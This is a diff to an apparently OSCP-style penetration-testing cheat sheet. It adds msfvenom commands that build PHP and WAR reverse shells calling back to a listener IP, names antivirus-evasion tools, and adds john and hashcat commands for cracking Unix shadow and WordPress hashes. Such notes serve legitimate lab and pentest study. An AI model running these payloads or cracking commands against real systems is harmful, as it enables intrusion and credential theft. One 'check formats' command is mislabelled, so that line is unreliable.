@@ -366,15 +366,32 @@ $ stty rows <num> columns <cols>
 
 ### Payload Creation
 
-`msfvenom`
+msfvenom
 
-`PrependMigrate=true`: migrate immediately after exploit, very useful
+```
+# PHP Reverse Shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
 
-`veil-evasion`
+# Java WAR reverse shell  
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
 
-`hyperion`
+# Check Payloads
+msfvenom --list payloads
 
-`unicorn`
+# Check formats
+msfvenom --list payloads
+
+# Remember to encode and specify bad chars if necessary
+
+# Migrate straight after exploit (meterpreter)
+PrependMigrate=true
+```
+
+veil-evasion
+
+hyperion
+
+unicorn
 
 ### Payload Compilation/Execution
 
@@ -396,33 +413,29 @@ Run windows exploits on Kali
 
 ### Password Attacks
 
-`hash-identifier`: identify hashes
+* `hash-identifier`: identify hashes
+* `echo "skjgdg67dsg5d67g5sd7" | base64 -d`: decode base64
+* `fcrackzip`: crack zip files
+*`unshadow passwd shadow > unshadowed`: prepare unix passwords for cracking
+`john unshadowed`: brute force
+`john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed`
+* Hashcat:
+```
+# Hashcat SHA512 $6$ shadow file  
+hashcat -m 1800 -a 0 hash.txt rockyou.txt --username
 
-`echo "skjgdg67dsg5d67g5sd7" | base64 -d`: decode base64
+#Hashcat MD5 $1$ shadow file  
+hashcat -m 500 -a 0 hash.txt rockyou.txt --username
 
-`fcrackzip`: crack zip files
+# Hashcat MD5 Apache webdav file  
+hashcat -m 1600 -a 0 hash.txt rockyou.txt
 
-#### Offline Attacks
+# Hashcat SHA1  
+hashcat -m 100 -a 0 hash.txt rockyou.txt --force
 
-* `crunch`:
-* `pwdump/fgdump`:
-* `Windows Credential Editor`
-* `cewl`
-* `john`: mutations
-
-#### Online Attacks
-
-* `hydra`
-* `medusa`
-* `ncrack`: can bruteforce Windows RDP
-
-#### Password Hash Attacks
-
-* `OpenWall`
-* `HashIdentifier`
-* `john`
-* `Pass the Hash`
-* `oclhashcat`
+# Hashcat Wordpress  
+hashcat -m 400 -a 0 --remove hash.txt rockyou.txt
+```
 
 ### Exploit Delivery
 
